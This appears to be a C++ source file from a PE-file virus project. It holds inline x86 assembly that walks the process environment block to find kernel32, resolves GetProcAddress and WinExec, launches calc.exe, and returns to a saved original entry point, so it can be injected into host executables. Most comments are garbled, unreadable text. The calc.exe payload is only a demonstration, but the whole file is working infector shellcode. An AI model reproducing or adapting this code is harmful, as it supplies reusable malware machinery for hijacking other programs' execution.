#include "pe.hpp"
#include "virus.hpp"
#include <Windows.h>
#include <deque>


// ���ܲ�֧�� 64 λ����Ϊ 64 λ�� ImageBase �ϴ�
std::string GetCalcuatorShellcode32(DWORD entry_point) {
	// ������ִ���������
	goto end;
	__asm {
	start:
		call A;
	A:
		//Ѱ��kernel32.dll�Ļ���ַ
		xor ecx, ecx;
		mov eax, dword ptr fs : [ecx + 30h] ; //EAX = PEB
		mov eax, dword ptr[eax + 0Ch]; //EAX = PEB->Ldr
		mov esi, dword ptr[eax + 14h]; //ESI = PEB->Ldr.InMemOrder
		lods dword ptr[esi]; //EAX = Second module
		xchg eax, esi; //EAX = ESI, ESI = EAX
		lods dword ptr[esi]; //EAX = Third(kernel32)
		mov ebx, dword ptr[eax + 10h]; //EBX = Base address
		//����kernel32.dll�ĵ�����
		mov edx, dword ptr[ebx + 3Ch]; //EDX = DOS->e_lfanew
		add edx, ebx; //EDX = PE Header
		mov edx, dword ptr[edx + 78h]; //EDX = Offset export table
		add edx, ebx; //EDX = Export table
		mov esi, dword ptr[edx + 20h]; //ESI = Offset names table
		add esi, ebx; //ESI = Names table
		xor ecx, ecx; //EXC = 0
		// �� AddressOfNames �����в��� GetProcAddress ����
	Get_Function:
		inc ecx; //Increment the ordinal
		lods dword ptr[esi]; //Get name offset
		add eax, ebx; //Get function name
		// PteG
		cmp dword ptr[eax], 50746547h;
		jne Get_Function;
		// Acor
		cmp dword ptr[eax + 4], 41636F72h;
		jne Get_Function;
		// erdd
		cmp dword ptr[eax + 8], 65726464h;
		jne Get_Function;
		// FIXME
		// ���ﲻ�ܹ���10����ô��ô�Ƚ��������������أ�
		// sser
		//cmp dword ptr[eax + 10], 73736572h;
		//jne Get_Function;
		// �����±�(ecx)�� AddressOfNameOrdinals �ҵ���Ӧ��ֵ
		mov esi, dword ptr[edx + 24h]; //ESI = Offset ordinals
		add esi, ebx; //ESI = Ordinals table
		// AddressOfNameOrdinals �� WORD ����
		mov cx, word ptr[esi + ecx * 2];
		dec ecx
			// AddressOfFunction ��Ѱ�Һ����� RVA
			mov esi, dword ptr[edx + 1Ch]; //ESI = Offset address table
		add esi, ebx; //ESI = Address table
		mov edx, dword ptr[esi + ecx * 4]; //EDX = Pointer(offset)
		add edx, ebx; //EDX = GetProcAddress
		push ebx; //PUSH kernel32.Base address
		push edx; //PUSH kernel32.GetProcAddress
		//Ѱ��WinExec������ַ
		xor ecx, ecx; //ECX = 0
		push ecx; //PUSH ECX
		// cex
		mov ecx, 00636578h;
		push ecx; //PUSH ECX
		// EniW
		push 456E6957h;
		push esp; //PUSH ESP WinExec
		push ebx; //PUSH EBX kernel32.Base address
		// ���� GetProcAddress
		call edx;
		add esp, 8; //ESP + 8
		pop ecx; //ECX = 0
		push eax; //PUSH EAX-- > kernel32.WinExec Addresss
		//��ֵ�������ַ���
		xor ecx, ecx; //ECX = 0
		push ecx; //PUSH ECX
		push 0x6578652E;
		push 0x636C6163; //calc.exe
		xor ebx, ebx; //EBX = 0
		mov ebx, esp; //EBX = "calc.exe"
		xor ecx, ecx;
		inc ecx;
		push ecx; //PUSH ECX = 1
		push ebx; //PUSH EBX = "calc.exe"
		// ���� WinExec
		call eax;
		// ��ջƽ��
		// �ú������ܲ�����ն�ջ
		add esp, 10h;
		pop edx; //EDX = kernel32.GetProcAddress
		pop ebx; //EBX = kernel32.Base Address
		// ԭ������ڵ���� shellcode ǰ 4 λ��call ָ��ռ�� 5 ���ֽ�
		pop eax;
		// �ظ�ջ��ָ��
		add sp, 4;
		sub eax, 9;
		jmp [eax];
	};
end:
	CHAR* buffer;
	size_t len;

	__asm {
		push eax;
		push ebx;
		mov eax, start;
		mov buffer, eax;
		lea eax, end;
		lea ebx, start;
		sub eax, ebx;
		mov len, eax;
		pop ebx;
		pop eax;
	};
	std::string shellcode;
	// ����ɵ���ڵ�
	for (int i = 0; i != sizeof(DWORD); i++) {
		shellcode.push_back(static_cast<CHAR>(entry_point >> (i * 8)));
	}
	for (size_t i = 0; i != len; i++) {
		shellcode.push_back(buffer[i]);
	}
	return shellcode;
}